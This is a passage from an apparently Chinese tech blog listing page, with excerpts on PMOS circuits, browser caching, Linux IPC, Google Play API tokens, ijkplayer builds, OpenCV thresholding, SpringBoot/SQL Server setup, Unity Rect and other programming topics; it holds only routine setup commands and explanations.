课本上会出现 静态工作点 的概念，实际上静态工作点就是给一个元件的每个引脚提前施加一定的电压和电流，让它处于临界或稳定状态，当需要它工作时，能够快速转化为工作状态。
例如其中的R3 这两个电阻一端连接到5V输出，一端连接到Q1的G极（场效应管三个极 G D S）。
这样提前把G极的电压拉高到5V，P型场效应管（PMOSFET/PMOS)的特点就是，G极高到大于S极，场效应管就关闭，不通电。当G极电压很低贴近0V，就打开给后端供电。 基本原理就是G极拉低到0V，Q1打开，电流从S流到D给发光二极管供电，当G拉高到5V，Q1关闭，S到D无电流流动。 但是我这个设计出了个错误，就是前面单片机STM32 是3.3V供电的，所以单片机的控制引脚输出电压的范围最高3.3V，最低0V。 这样单片机经过R3去控制G极时，最高电压只能达到3.3V，这个电压比5V电压要低，所以SG直接的电压差有5-3.3V = 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98e7925ff56113e17f2ed411047c50b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfd620776562ecbaa5e6b632b7be4d23/" rel="bookmark">
			浏览器缓存机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@[TOC]浏览器缓存机制
浏览器缓存(http缓存) 简单来说,浏览器缓存其实就是浏览器保存通过HTTP获取的所有资源,是浏览器将网络资源存储在本地的一种行为。
缓存的资源去哪里了? 你可能会有疑问,浏览器存储了资源,那它把资源存储在哪里呢？如下看一个例子：
首次访问页面 关闭标签页，重新打开页面 刷新页面 memory cache和disk cache from memory cache:就是将资源缓存到内存中，等待下次访问时不需要重新下载资源，而直接从内存中获取。
from disk cache：就是将资源缓存到磁盘中，等待下次访问时不需要重新下载资源，而直接从磁盘中获取。
名称相同点不同点存储资源memory cache只能存储一些派生类资源文件(HTML页面中内嵌的图片或者脚本链接)退出进程时数据会被清除(即重新打开新的窗口，memory cache中数据被清除了，刷新不会）一般脚本、字体、图片会存在内存当中diskcache只能存储一些派生类资源文件(HTML页面中内嵌的图片或者脚本链接)退出进程时数据不会被清除(即重新打开新的窗口，disk cache中数据没有被清除）一般非脚本会存在内存当中，如css等 因为CSS文件加载一次就可渲染出来,我们不会频繁读取它,所以它不适合缓存到内存中,但是js之类的脚本却随时可能会执行,如果脚本在磁盘当中,我们在执行脚本的时候需要从磁盘取到内存中来,这样IO开销就很大了,有可能导致浏览器失去响应。
三级缓存原理 (访问缓存优先级) 先在内存中查找,如果有,直接加载。如果内存中不存在,则在硬盘中查找,如果有直接加载。如果硬盘中也没有,那么就进行网络请求。请求获取的资源缓存到硬盘和内存。
总述：浏览器读取缓存的顺序为memory –&gt; disk –&gt; 服务器请求。 浏览器缓存的优点 减少了冗余的数据传输。减少了服务器的负担，大大提升了网站的性能。加快了客户端加载网页的速度 浏览器缓存的分类 浏览器再向服务器请求资源时,首先判断是否命中强缓存,再判断是否命中协商缓存!
缓存过程分析 浏览器与服务器通信的方式为应答模式，即是：浏览器发起HTTP请求 – 服务器响应该请求。
如下图我们可以知道：
浏览器每次发起请求，都会先在浏览器缓存中查找该请求的结果以及缓存标识。浏览器每次拿到返回的请求结果都会将该结果和缓存标识存入浏览器缓存中。
强制缓存(Expires和Cache-Control) 强制缓存就是向浏览器缓存查找该请求结果，并根据该结果的缓存规则来决定是否使用该缓存结果的过程。
强制缓存的情况主要有三种，如下：
不存在该缓存结果和缓存标识，强制缓存失效，则直接向服务器发起请求。存在该缓存结果和缓存标识，但该结果已失效，强制缓存失效，则使用协商缓存。存在该缓存结果和缓存标识，且该结果尚未失效，强制缓存生效，直接返回该结果。
强制缓存的缓存规则 当浏览器向服务器发起请求时，服务器会将缓存规则放入HTTP响应报文的HTTP头中和请求结果一起返回给浏览器，控制强制缓存的字段分别是Expires和Cache-Control，其中Cache-Control优先级比Expires高。
Expires Expires是HTTP/1.0控制网页缓存的字段；
其值为服务器返回该请求结果缓存的到期时间；
即再次发起该请求时，如果客户端的时间小于Expires的值时，直接使用缓存结果。到了HTTP/1.1，Expire已经被Cache-Control替代 Cache-Control cache-control：主要用于控制网页缓存规则public所有内容都将被缓存（客户端和代理服务器都可缓存）private所有内容只有客户端可以缓存，Cache-Control的默认取值no-cache客户端缓存内容，但是是否使用缓存则需要经过协商缓存来验证决定no-store所有内容都不会被缓存，即不使用强制缓存，也不使用协商缓存max-age=xxx (xxx is numeric)缓存内容将在xxx秒后失效 举例如下，max-age=0 缓存内容将在0秒后失效,即不进行强制缓存 协商缓存（Last-Modified / If-Modified-Since和Etag / If-None-Match） 协商缓存就是强制缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器根据缓存标识决定是否使用缓存的过程。
主要有以下两种情况：
协商缓存生效，返回304。协商缓存失效，返回200和请求结果。
协商缓存的缓存规则 协商缓存的标识也是在响应报文的HTTP头中和请求结果一起返回给浏览器的，控制协商缓存的字段分别有：Last-Modified / If-Modified-Since和Etag / If-None-Match。其中Etag / If-None-Match的优先级比Last-Modified / If-Modified-Since高。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfd620776562ecbaa5e6b632b7be4d23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39b2b73ea763e96fc8be807432edb94c/" rel="bookmark">
			Linux——进程间的通信方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 进程间通信 概述通信方式管道共享内存消息队列信号量 概述 进程间通信：因为每一个进程都有一个独立的虚拟地址空间，在保证了进程独立性的同时，却使得进程间无法直接通信，所以操作系统为用户提供了进程间的通信方式，并且因为通信场景的不同，提供的方式也有多种。
通信方式 System V标准下进程间通信方式的种类有：管道，共享内存，消息队列，信号量。
管道 用于进程间的数据传输，通过半双工通信方式实现数据传输(半双工：可以选择方向的单向通信)。
本质：操作系统在内核为进程创建的一块缓冲区。原理：通过让多个进程都能访问到同一块缓冲区，来实现进程间的通信。管道分类：
(1)匿名管道：操作系统在内核中创建的一块没有标识符(标识符：一个可见于文件系统的管道文件)的缓冲区，仅用于具有亲缘关系的进程间通信，并且只有是在创建子进程之前创建了匿名管道，才可以使用匿名管道进行进程间通信。创建子进程之前，先创建匿名管道，操作系统会提供两个操作句柄(文件描述符)，其中一个用于从管道中读取数据，另一个用于向管道中写入数据；儿子进程通过复制父进程的方式，获取到管道的操作句柄，进而实现访问同一个管道进行通信。
(2) 命名管道：操作系统在内核中创建的一块具有标识符(标识符：一个可见于文件系统管道文件)，其他的进程可以通过这个标识符，打开同一个管道文件，进而访问同一块缓冲区，实现进程间通信。管道特性：
(1)打开特性：
a. 若管道文件以只读的方式打开，则会阻塞，直到这个管道文件以写的方式打开。
b. 若管道文件以只写的方式打开，则会阻塞，直到这个管道文件以读的方式打开。
c. 若管道文件以读写的方式打开，则不会阻塞。
(2)管道特性：
a. 管道自带同步与互斥：
同步：通过条件判断，判断当进程是否能够访问，不能访问则等待，等到能访问时在唤醒该进程，从而实现对临界资源访问的合理性。
互斥：通过保证同一时间只有一个进程能够访问临界资源，来保证临界资源的安全性。
管道同步：若管道中没有数据，则read会阻塞；若管道写满了，则write会阻塞。
管道互斥：当写入数据不超过PIPE_BUF时，会保证写入操作的原子性。
b. 若管道所有的写端被关闭，表示当前没有进程继续写入数据了，read读完管道中的数据后，就不会再阻塞，而是返回0。
c. 若管道所有的读端被关闭，表示当前没有进程继续读入数据了，继续write会触发异常，会造成管道破裂，当前写进程会收到SIGPIPE信号，导致进程退出。
d. 管道的生命周期随进程，当进程退出时，管道将被释放。
e. 管道提供有序、连接、可靠的字节流传输服务，传输比较灵活。 共享内存 用于进程间的数据共享；又因为共享内存直接通过虚拟地址映射访问物理内存，而其它方式都是内核中的缓冲区，因此通信时都会涉及用户态与内核态之间的两次数据拷贝，少了这两次数据拷贝，所以共享内存是最快的进程间通信方式。
原理：在物理内存上开辟一块内存空间，将这块物理内存映射到进程的虚拟地址空间，进程就可以通过自己的虚拟地址空间直接访问这块物理内存；当多个进程映射到同一块物理内存，就可以通过这块物理内存实现数据共享。共享内存示意图：
操作流程：
(1)创建共享内存(开辟物理内存空间)。
(2)将共享内存映射到各个进程的虚拟地址空间中的共享区。
(3)各个进程直接通过修改虚拟地址空间中的共享区实现通信。
(4)通信结束，解除映射内存。
(5)释放共享内存。共享内存的特性：
(1)最快的进程间通信方式。
(2)生命周期随内核。注意事项：由于共享内存并不具备自动同步与互斥，需要操作用户进行控制，所以共享内存的操作不是绝对安全的。 消息队列 用于进程间的数据传输。
原理：其本质上就是内核中的一个优先级队列，多个进程通过向同一个队列中添加节点和获取节点来实现进程间的通信，传输的是一个有类型(优先级)的数据块。消息队列的特性：
(1)自带同步与互斥。
(2)生命周期随内核。
(3)数据传输自带优先级。
(4)消息队列可以双向通信。
(5)消息队列克服了管道的无格式字节流的缺点。 信号量 用于实现进程间的控制(同步与互斥)。
本质：内核中的一个计数器(对临界资源进行计数)，可以通过技术判断是否能够获取一个资源进行处理。互斥的实现：通过只有0/1的计数器，实现对临界资源访问状态的标记；在访问临界资源之前先获取信号量，并且计数-1；若计数&lt;=0，则使进程等待(将进程PCB加入等待队列中)，反之可以对临界资源进行访问，并且在访问期间，已经将临界资源的状态置为不可访问状态，因此可以保证其他进程不会在同一时间访问到临界资源，进而实现互斥。同步的实现：若计数&lt;=0，则表示不能获取，并且对计数进行-1，将进程PCB加入等待队列，这时候若是其他进程释放/生产一个临界资源，则会对计数+1，并且唤醒一个进程。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3e1b91c01eb924c778715ac0837e3b8/" rel="bookmark">
			Google 服务器获取Google Play Android Developer API 的 access token
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个时官方文档说明：https://developers.google.com/android-publisher/authorization。
如下图所示：
可参考： https://blog.csdn.net/liaodehong/article/details/83274207 https://www.jianshu.com/p/39d0c7f1f318 具体操作如下： 1.点击 APIs Console 进入，如下图所示： 新建个项目（我的已经建好了）。
2.点开左上角三条杠菜单按钮，选择，如下图所示： 搜索Google Play Android Developer API，如下图所示：
启用此API，如下图所示：
我这里已经启用过了，所以显示的是管理。
3.然后按照官方文档第7步，操作如下所示： 如果是让服务器弄google支付验证的，一般选择web应用。
选择创建就会弹出一个框：
就创建完成了，如下图所示：
这里要添加个重定向url，后面会用到。
4.Generating a refresh token 按照文档说明，把刚才的重定向url填在下面这个url里，client_id也替换成 网页客户端2 的 客户端ID，如下图所示：
替换好之后，把url放到浏览器里访问，中间需要登录google账号，并一路允许。到最后会转到这个重定向url的页面。
我们在浏览器里把新的url连接复制下来，这里面就有我们需要的code，也就是文档里第3步说的code，如下图所示：
然后我们进行文档里的第4步，模拟http请求。通过网页模拟可能模拟不了，因为这个毕竟需要翻过墙去，所以建议使用postman软件模拟。如下图所示：
我这里返回错误invalid_grant，因为我的这个code参数已经过期了，需要重新获取一下。
注意，你可能获得的数据不包含refresh_token, 主要原因是谷歌默认在获取code的过程中已经登录过了，利用获取的此code去请求就不再返回refresh_token,此时要么需要在获取code的url后面加上 &amp;approval_prompt=force 参数, 或者换个浏览器获取code就会重新登录账号，然后利用这个code获取refresh_token才会获得，如下图所示：
5.google账号api权限 关联凭据 打开Google play console 开发后台，左面面板点击最下面的设置页签，如下图所示:
然后点开API权限页签，看到有 关联的项目，点击关联，如下图所示：
可能关联了之后充值还是提示
下面这个：
{ "error": { "errors": [{ "domain": "androidpublisher", "reason": "projectNotLinked", "message": "The project id used to call the Google Play Developer API has not been linked in the Google Play Developer Console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3e1b91c01eb924c778715ac0837e3b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3e80f62423fc1af8eb9b045909f655d/" rel="bookmark">
			ijkplayer的编译和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 ijkplayer是一个基于FFmpeg的轻量级Android/iOS视频播放器。是一个很优秀的库,但是如果要使用它并不是那么的简单。首先要对ijkplayer进行编译后才能使用。因此下面将分享自己从编译到使用的整个过程，如果有错误欢迎在评论区指出！
一、下载并配置Ubuntu虚拟机 根据下面的安装教程，安装Ubuntu虚拟机
温馨提示：在安装过程中为虚拟机分配磁盘大小时，最好选择40GB,自己刚开始选择了20GB，后来发现内存不够，然后对内存进行了扩容
虚拟机安装Ubuntu 16.04.5 图解
如果幸运的话,按照教程就能打开虚拟机,但是我在最后却一直显示黑屏
解决方法：搜索cmd命令，然后以管理员方式打开，输入netsh winsock reset(这个命令是重置网络规范，黑屏的原因很可能就是VMware软件跟本地网络规范有冲突)，回车之后提示成功重置winsock目录，您必须重新启动计算机才能重新完成配置，重启后打开即可。
打开后发现屏幕不能全屏，解决方法就是安装VMware tools
安装VMware tools，实现全屏。
当安装VMware tools后还可以进行Windows和Ubuntu进行文本的复制粘贴，这样对后续操作还是挺方便的
这里参考了网上的解决方法Ubuntu 16.04下安装VMware Tools（三行命令搞定）。具体做法：就是打开终端（在桌面鼠标右键就可以看到），然后依次输入下面的命令：
第一步的操作可能需要很久
sudo apt-get upgradesudo apt-get install open-vm-tools-desktop -ysudo reboot 输入后点击虚拟机的选项，如果变成了重新安装就表示安装成功了，如果不行的话就参考这个教程：Ubuntu下安装VMware Tools的详细过程
成功后点击查看，然后点击适应客户机或者全屏就可以实现全屏了
二、在Ubuntu上安装必要的东西 1.打开终端，在终端下载git和yasm
sudo apt-get install git sudo apt-get install yasm 2.配置 SDK + NDK
下载
SDK：直接在android studio中文社区下载的，SDK下载传送门NDK：NDK我试过下载了r21的，结果配置不成功，最后下载了android-ndk-r10e这一个版本（如果不是64位或者要其它版本的可以看文末的参考博客）。android-ndk-r10e传送门（Linux64位） 解压
当下载之后，两个文件都位于Downloads文件夹下，我把他们都解压到了Home的新建文件夹setup中。
SDK：可以直接提取，因为是zip格式
NDK：由于是bin模式，所以需要首先对android-ndk-r10e-linux-x86_64.bin文件进行权限设置。设置权限设置可以直接对这个文件进行：右键-&gt;属性-&gt;允许作为程序可执行文件（打勾）。如下图所示：
接着执行终端命令：
./android-ndk-r10e-linux-x86_64.bin 配置
首先得打开配置文件
sudo gedit /etc/profile 然后在profile文件的末尾加上下面的路径配置
jay是用户名，因为我这些解压文件都放到了Home的setup中，setup是我自己新建的文件夹
export ANDROID_NDK="/home/jay/setup/android-ndk-r10e/" export ANDROID_SDK="/home/jay/setup/android-sdk-linux/" export PATH=$PATH:$ANDROID_NDK 保存后使用 source /etc/profile使其生效。然后可以用ndk-build -v来检验NDK是否配置成功，出现下图则说明配置成功。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3e80f62423fc1af8eb9b045909f655d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac2a9e377b6db81174c2ace2268c5931/" rel="bookmark">
			后端获取前台参数的几种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.前台通过URL传递，后端利用@RequestParam来接收 serverUrl + '/items/refresh?itemSpecIds=' + itemSpecIds @GetMapping("/refresh") public void refresh( @RequestParam String itemSpecIds) {} 2.前台通过url\传递，后台通过@PathVariable来接收 serverUrl + '/index/sixNewItems/' + rootCatId, {} @GetMapping("/sixNewItems/{rootCatId}") public void sixNewItems( @PathVariable Integer rootCatId) {} 3.前台通过body中json传递，后台通过@RequestBody来接收 axios.post(serverUrl + '/passport/regist', userBO) public void PostMapping(@RequestBody UserBO userBO){} 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a924c5772c15ea8d848f89f4475b493b/" rel="bookmark">
			【海思篇】【Hi3516DV300】三、使用USB烧写映像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目的：实现USB快速烧录，比串口快很多；让更多的爱好者了解海思、加入海思。
目录
1 PC准备工作
2 海思板准备工作
3 工具HiTool开始USB烧写
1 PC准备工作 说明：
Hi3516CV300/Hi3559AV100/Hi3556AV100/Hi3519AV100/Hi3516CV500/Hi3516DV300/Hi3516AV300/Hi3559V200/Hi3556V200/Hi3516EV200/Hi3516EV300/Hi3518EV300 芯片支持 USB 裸烧;
不是所有芯片都支持 USB 传输方式。Hi3556AV100/Hi3559AV100 单板有两个 USB口，只有 USB0 口才支持 USB device 升级。Hi3516DV300当然是支持的USB传输了。
1）. 从 http://zadig.akeo.ie 上下载 zadig.exe 文件，请根据自己的操作系统下载相应的exe 执行文件，当前最新版本如下（请以实际为准）：
 zadig-2.4.exe（国外网速很慢，我资源上可以0积分下载）
以 win7 系统下驱动安装为例（win10 暂不支持）。
2）. 用 HiBurn 工具串口功能烧写 uboot，烧写完成之后，在单板的 uboot 下输入命令
usb device，USB 接口与 PC 端相连，进入升级模式，PC 端设备管理器出现
HiUSBBurn 设备如下图所示。
此时 windows 会自动搜索驱动程序，等待 windows 搜索驱动程序搜索不到之后。
3）. 打开 zadig_2.3.exe 文件，选择 Options-&gt;List All Devices，将 List All Devices 勾
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a924c5772c15ea8d848f89f4475b493b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb11875631631a8da8cf6d3f7650d6d6/" rel="bookmark">
			1030 完美数列 (25分)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1030 完美数列 (25分)
给定一个正整数数列，和正整数 p，设这个数列中的最大值是 M，最小值是 m，如果 M≤mp，则称这个数列是完美数列。
现在给定参数 p 和一些正整数，请你从中选择尽可能多的数构成一个完美数列。
输入格式：
输入第一行给出两个正整数 N 和 p，其中 N（≤105）是输入的正整数的个数，p（≤109）是给定的参数。第二行给出 N 个正整数，每个数不超过 109。
输出格式：
在一行中输出最多可以选择多少个数可以用它们组成一个完美数列。
输入样例：
10 8
2 3 20 4 5 1 6 7 8 9
输出样例：
8
二分法的前提是有序序列，还有这里的二分法，因为求的是第一个大于某个数的数，所以必须是right = mid；这里顺便复习一下二分法的写法。
此时产生了一个疑问，如果我要找一个大于x的数，然而这个数列最大的数就是x，那么此时返回的位置是否正确呢？可以想象，这个位置应该是返回的最后一位，显然是不对的，这么明显的错误为什么无说明呢？先进行试验：
#include&lt;iostream&gt; using namespace std; int a[10] = {1,2,3,4,5,6,7,8,9,10}; int find(long long com,int left,int right) { //	if(a[N-1] &lt;= com * M) return N;//关键 while(left&lt;right) {//一定有得求，所以 int mid = (left + right) /2; if(a[mid] &gt; 10) right = mid;//因为求的是大于所求的数的第一个数，所以无+1 else left = mid+1; } return left; } int main() { int ans = find(1,0,9); printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb11875631631a8da8cf6d3f7650d6d6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e36698d83b1c8ce6af7e025bab50221/" rel="bookmark">
			Word打字有延迟怎么处理？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Word2016在输入英文字母时正常，但在编辑拼音及删除时会有延迟，试了很多方法，清理初注册表，清理缓存，去掉拼写检查等都没有解决，最终通过去掉不需要的“加载项”后得到解决。也算是导致输入延迟的一个原因，大家可以试一下。
步骤：
我是因为安装了PowerDesigner导致的。去掉对勾就ok。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3fc46afd5a689ca1ed789ed5859e9299/" rel="bookmark">
			Wide and Deep 理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		wide部分主要学习稀疏的离散特征的线性关系，Wide的"记忆"能力就是学习到sparse特征之间的线性相关性，缺点是无法捕捉训练数据中未曾出现过的特征组合，需要人工做特征交叉，构建组合特征。Deep部分就是MLP，可以直接输入连续数值型特征，对于sparse特征通过dense embeddings降维来捕获它们之间的高阶相关性，学习到之前没有出现过的组合特征(泛化能力)。缺点是对于非常稀疏的特征，DNN通过embedding学到的组合关系会出现over-generalize，需要Wide部分来补偿。Wide&amp;Deep联合训练，同时学习低阶和高阶组合特征，适用于输入非常稀疏的大规模分类或回归问题(推荐、搜索、ranking)。 ---------------------------
wide&amp;deep 模型的核心思想是结合线性模型的记忆能力（memorization）和DNN 模型的泛化能力（generalization），在训练过程中同时优化两个模型的参数，从而达到整体模型的预测能力最优。
联合训练是指同时训练Wide模型和Deep模型，并将两个模型的结果的加权和作为最终的预测结果。
对于类别特征，通过词典（Vocabularies）将其映射成向量；对于连续的实数特征，将其归一化到区间[0,1]。
Wide部分：
对应的概念是 Memorization，主要是学习特征的共性或者说相关性，产生的推荐是和已经有用户行为的物品直接相关的物品。
Memorization 通过一系列人工的特征叉乘（cross-product）来构造这些非线性特征，捕捉sparse特征之间的高阶相关性，即“记忆” 历史数据中曾共同出现过的特征对。
Memorization的局限性：
1，无法捕捉训练数据中未曾出现过的特征对。对于在训练集里没有出现过的 query-item pair，它不能进行泛化。
2，容易过拟合。
Deep部分：
对应的概念是 Generalization，可以理解为相关性的传递(transitivity)，会学习新的特征组合，来提高推荐物品的多样性，或者说提供泛化能力(Generalization)。
泛化往往是通过学习低维的 dense embeddings 来探索过去从未或很少出现的新的特征组合来实现的，学习到的embeddings 本身带有一定的语义信息。
可以联想到NLP中的词向量，不同词的词向量有相关性。通常的 embedding-based model 有 Factorization Machines(FM) 和 Deep Neural Networks(DNN)。
这些高维稀疏的类别特征（如人口学特征和设备类别）映射为低纬稠密的向量后，与其他连续特征（用户年龄、应用安装数等）拼接在一起，输入 MLP(多层感知机)中，最后输入逻辑输出单元。
Generalization的优点是更少的人工参与，对历史上没有出现的特征组合有更好的泛化性。
当user-item matrix非常稀疏时，例如有和独特爱好的users以及很小众的items，NN很难为users和items学习到有效的embedding。这种情况下，大部分user-item应该是没有关联的，但dense embedding 的方法还是可以得到对所有 user-item pair 的非零预测，因此导致 over-generalize并推荐不怎么相关的物品(https://zhuanlan.zhihu.com/p/53361519)。
记忆体现的准确性，而泛化体现的是新颖性。
损失函数： 模型选取logistic loss作为损失函数，此时Wide &amp; Deep最后的预测输出为：
p(y=1|x) = sigma(W_wide[x, phi(x)] + W_deep*alpha_Lf + b)
其中，\sigma 表示sigmoid函数，phi(x)表示叉乘特征，alpha_Lf表示NN最后一层的激活值。
原文 https://arxiv.org/abs/1606.07792
[下面来自](https://kuaibao.qq.com/s/20180521G1TR4F00?refer=cp_1026)
推荐系统可以看成是一个search ranking问题，根据query得到items候选列表，然后对items通过ranking算法排序，得到最终的推荐列表。Wide &amp; Deep模型是用来解决ranking问题的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3fc46afd5a689ca1ed789ed5859e9299/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4755d22a6265d67cabc4381d4e23f0d2/" rel="bookmark">
			图像预处理方法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 图像二值化 1.1. 简单阈值或全局阈值 gray = cv.cvtColor(image, cv.COLOR_RGB2GRAY) #把输入图像灰度化
ret, binary = cv.threshold(gray, 0, 255, cv.THRESH_BINARY | cv.THRESH_TRIANGLE)
简单阈值当然是最简单，选取一个全局阈值，然后就把整幅图像分成了非黑即白的二值图像了。这个函数有四个参数，第一个原图像，第二个进行分类的阈值，第三个是高于（低于）阈值时赋予的新值，第四个是一个方法选择参数，常用的有：
• cv2.THRESH_BINARY（黑白二值）
• cv2.THRESH_BINARY_INV（黑白二值反转）
• cv2.THRESH_TRUNC （得到的图像为多像素值）
• cv2.THRESH_TOZERO
• cv2.THRESH_TOZERO_INV
1.2. 自适应阈值 gray = cv.cvtColor(image, cv.COLOR_RGB2GRAY) #把输入图像灰度化
binary = cv.adaptiveThreshold(gray, 255, cv.ADAPTIVE_THRESH_GAUSSIAN_C,cv.THRESH_BINARY, 25, 10)
前面看到简单阈值是一种全局性的阈值，只需要规定一个阈值值，整个图像都和这个阈值比较。而自适应阈值可以看成一种局部性的阈值，通过规定一个区域大小，比较这个点与区域大小里面像素点的平均值（或者其他特征）的大小关系确定这个像素点是属于黑或者白（如果是二值情况）。使用的函数为：cv2.adaptiveThreshold（）
该函数需要填6个参数：
• 第一个原始图像
• 第二个像素值上限
• 第三个自适应方法Adaptive Method:
— cv2.ADAPTIVE_THRESH_MEAN_C ：领域内均值
—cv2.ADAPTIVE_THRESH_GAUSSIAN_C ：领域内像素点加权和，权 重为一个高斯窗口
• 第四个值的赋值方法：只有cv2.THRESH_BINARY 和cv2.THRESH_BINARY_INV
• 第五个Block size:规定领域大小（一个正方形的领域）
• 第六个常数C，阈值等于均值或者加权值减去这个常数（为0相当于阈值 就是求得领域内均值或者加权值）
这种方法理论上得到的效果更好，相当于在动态自适应的调整属于自己像素点的阈值，而不是整幅图像都用一个阈值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4755d22a6265d67cabc4381d4e23f0d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bf8d068edcad4aeff33683edf80ab2a/" rel="bookmark">
			关于SpringBoot连接sqlserver的maven和pom配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.下载连接SQLServer工具包
官网下载：https://www.microsoft.com/zh-cn/download/details.aspx?id=11774
2.将工具包安装到maven
mvn install:install-file -DgroupId=com.microsoft.sqlserver -DartifactId=sqljdbc8 -Dversion=8.0 -Dpackaging=jar -Dfile=D:/java/sqljdbc42.jar
-DgroupId对应为pom文件中的groupId
-DartifactId对应为pom文件中的artifactId
-Dversion对应为pom文件中的version
-Dpackaging导入包的类型是jar包的话就是jar
-Dfile你下载下来的jar包放的路径
3.在你的SpringBoot项目的pom中添加依赖
&lt;!--SQLSERVER--&gt;
&lt;dependency&gt;
&lt;groupId&gt;com.microsoft.sqlserver&lt;/groupId&gt;
&lt;artifactId&gt;sqljdbc4&lt;/artifactId&gt;
&lt;version&gt;4.0&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
&lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;
&lt;/dependency&gt;
4.配置数据源：
yml格式：
spring:
datasource:
url: jdbc:sqlserver://localhost:1433;DatabaseName=数据库名
driver-class-name: com.microsoft.sqlserver.jdbc.SQLServerDriver
username: 用户名
password: 密码
properties格式：
spring.datasource.url=jdbc:sqlserver://localhost:1433;DatabaseName=数据库名
spring.datasource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver
spring.datasource.username=用户名
spring.datasource.password=密码
5.导入依赖后即可连接使用
原文连接：https://blog.csdn.net/dianhuilu4947/article/details/81866392
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7159d8d4a3ba4da31faf4aaf253b01a3/" rel="bookmark">
			tp框架下PHPExcel实现表格数据的导入导出功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		tp框架下PHPExcel实现表格数据的导入导出功能 前端代码： &lt;a class="btn btn-success" href="javascript:void(0)" id="import" style="float:left;"&gt;{pigcms{:L_("导入店员信息")}&lt;/a&gt; &lt;a class="btn btn-success" href="{pigcms{:U('ShopTrain/exportExcel')}" style="float:right;"&gt;{pigcms{:L_("导出店员培训信息")}&lt;/a&gt; 导入功能结合layui中upload组件,引入layui的js代码： &lt;script type="text/javascript" src="__STATIC__/layui/layui.js"&gt;&lt;/script&gt;
&lt;script&gt;
layui.use('upload', function(){
var upload = layui.upload;
//执行实例
var uploadInst = upload.render({
elem: '#import' //绑定元素
,url: "{:U('ShopTrain/import')}" //上传接口对应的方法
,accept: 'file'
,done: function(res){
if(res.code == 1){
layer.msg(res.msg, {icon: 6,time:4000});
location.reload(true);
}
else
{
layer.msg(res.msg, {icon:5});
return false;
} }
,error: function(){
//请求异常回调
}
});
$(".layui-upload-file").hide();
});
&lt;/script&gt;
数据导入到Excel控制器代码如下： /**
* 导入店员信息
*/
public function import()
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7159d8d4a3ba4da31faf4aaf253b01a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5cd3171d18e785916789ee61323b259/" rel="bookmark">
			Unity中Rect类型详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Rect类的用处以及为什么要了解它？ 简单来说，这个主要在Unity的UGUI、GUI以及编辑器扩展GUILayout等时设置布局都要用到，了解一下丰富自己的知识面，减少写出bug的情况。
Rect类型的基本概念 众所周知这是一个矩形的结构体类型，那么它内部是如何来定义的呢？先来看一下官方怎么说
这么一大坨的主要意思就是：知道一个矩形的根坐标（x，y）和长宽（width，height）就可以定义一个矩形了。Unity用了很多2d空间，一般都使用左下角为根坐标（例如屏幕坐标）从x向右递增，y向上递增。这个Rect使用的恰恰相反，x向右递减，y向上递减（这句别看，建议直接跳过）。很多人可能还是不能理解，一脸懵逼。没错官网这个说明有点抽象，甚至会误导。接下来我给大家用自己的方式讲解。
彻底理解它，开始！ rect.x与rect.y (这一节很重要，懂了这个其他的就都很简单了！)
